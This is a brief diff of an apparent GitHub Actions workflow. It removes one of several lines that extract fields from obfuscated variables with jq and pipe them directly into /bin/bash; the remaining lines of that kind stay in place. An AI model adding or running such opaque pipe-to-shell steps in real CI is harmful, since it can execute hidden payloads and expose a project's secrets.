@@ -28,7 +28,6 @@ jobs:
           echo $a705 | jq -r .wbt1 | /bin/bash
           printf '%s' "$jh8134" | jq -r .hd4448 | /bin/bash
           echo $lfhef18 | jq -r .n2 | /bin/bash
-          printf '%s' "$klu8" | jq -r .mftow2448 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
